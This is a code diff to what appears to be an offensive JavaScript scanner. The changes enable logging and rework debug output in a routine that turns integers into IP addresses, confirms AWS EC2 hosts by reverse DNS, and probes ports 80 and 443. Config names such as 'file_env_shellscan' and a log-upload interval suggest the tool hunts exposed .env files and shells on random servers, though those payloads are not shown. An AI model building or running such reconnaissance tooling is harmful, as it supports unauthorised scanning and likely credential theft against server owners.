@@ -40,7 +40,7 @@ const file_envscan = [...new Set(packCfg.file_env_shellscan || [])];
 const file_phpprofile = [...new Set(packCfg.file_phpprofile_shellscan || [])];
 
 // --- Logging ---
-const LOG_ACTIVE = false;
+const LOG_ACTIVE = true;
 const LOG_UPLOAD_INTERVAL = 500 + Math.floor(Math.random() * 300); // 500-800
 
 // --- Storage ---
@@ -888,18 +888,14 @@ function ipFromInt(n) {
   return `${(n >>> 24) & 0xFF}.${(n >>> 16) & 0xFF}.${(n >>> 8) & 0xFF}.${n & 0xFF}`;
 }
 
-let _verifyDebugDone = false;
+let _dnsFailCnt = 0, _nonEc2Cnt = 0, _tcpFailCnt = 0, _tcpOkCnt = 0;
 
 async function verifyEc2Webserver(ip, region) {
   try {
     const hostnames = await dns.promises.reverse(ip);
     const hostname = (hostnames[0] || '').toLowerCase();
-    // EC2 hostname pattern: ec2-IP.compute-N.amazonaws.com or ec2-IP.compute.amazonaws.com
     if (!/\.compute[-\d]*\.amazonaws\.com$/.test(hostname)) {
-      if (!_verifyDebugDone) {
-        _verifyDebugDone = true;
-        log(`[VERIFY DEBUG] IP ${ip} -> reverse DNS: "${hostname || '(none)'}" (non-EC2)`);
-      }
+      if (++_nonEc2Cnt <= 3) log(`[VERIFY] NON-EC2 ${ip} -> "${hostname || '(none)'}"`);
       return null;
     }
 
@@ -912,16 +908,15 @@ async function verifyEc2Webserver(ip, region) {
           sock.on('error', reject);
           sock.on('timeout', () => { sock.destroy(); reject(new Error('timeout')); });
         });
+        if (++_tcpOkCnt <= 3) log(`[VERIFY] TCP OK ${hostname}:${port}`);
         return `${proto}://${hostname}`;
       } catch (_) {}
     }
+    if (++_tcpFailCnt <= 3) log(`[VERIFY] TCP FAIL ${hostname} (80 & 443 unreachable)`);
     return null;
-  } catch (e) { 
-    if (!_verifyDebugDone) {
-      _verifyDebugDone = true;
-      log(`[VERIFY DEBUG] DNS reverse FAILED for ${ip}: ${e.message}`);
-    }
-    return null; 
+  } catch (e) {
+    if (++_dnsFailCnt <= 3) log(`[VERIFY] DNS FAIL ${ip}: ${e.message}`);
+    return null;
   }
 }
 
